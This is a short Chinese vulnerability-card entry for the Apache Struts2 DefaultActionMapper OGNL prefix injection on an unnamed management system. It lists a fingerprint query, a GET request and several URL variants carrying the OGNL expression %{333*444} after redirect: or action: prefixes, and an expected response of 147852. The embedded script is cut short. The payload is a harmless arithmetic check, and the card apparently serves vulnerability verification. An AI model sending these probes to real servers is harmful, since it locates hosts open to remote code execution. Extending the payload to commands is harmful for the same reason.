# 某管理系统ApacheStruts2DefaultActionMapper前缀OGNL代码执行漏洞

- **系统**：某管理系统ApacheStruts2DefaultActionMapper前缀OGNL　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Struts2"`
- **请求**：`GET /system/rand.action?redirect:%25{333*444} HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=453A6B376FC7D28A5F46F657AEECE509; nowuse_fd_Info=`　`Host: 127.0.0.1`

**请求体 / payload**
```
其他URL
[http://127.0.0.1/system/rand.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/system/rand.action?redirect:%2525%257B333*444%257D%22)
[http://127.0.0.1/index.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/index.action?redirect:%2525%257B333*444%257D%22)
[http://127.0.0.1/login.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/login.action?redirect:%2525%257B333*444%257D%22)
[http://127.0.0.1/user.action?redirect:%25%7B333*444%7D"](http://127.0.0.1/user.action?redirect:%2525%257B333*444%257D%22)
[http://127.0.0.1/index.action?action:%25%7B333*444%7D"](http://127.0.0.1/index.acti…（脚本共 773 字，完整版见原文）
```
- **预期**：200　|　147852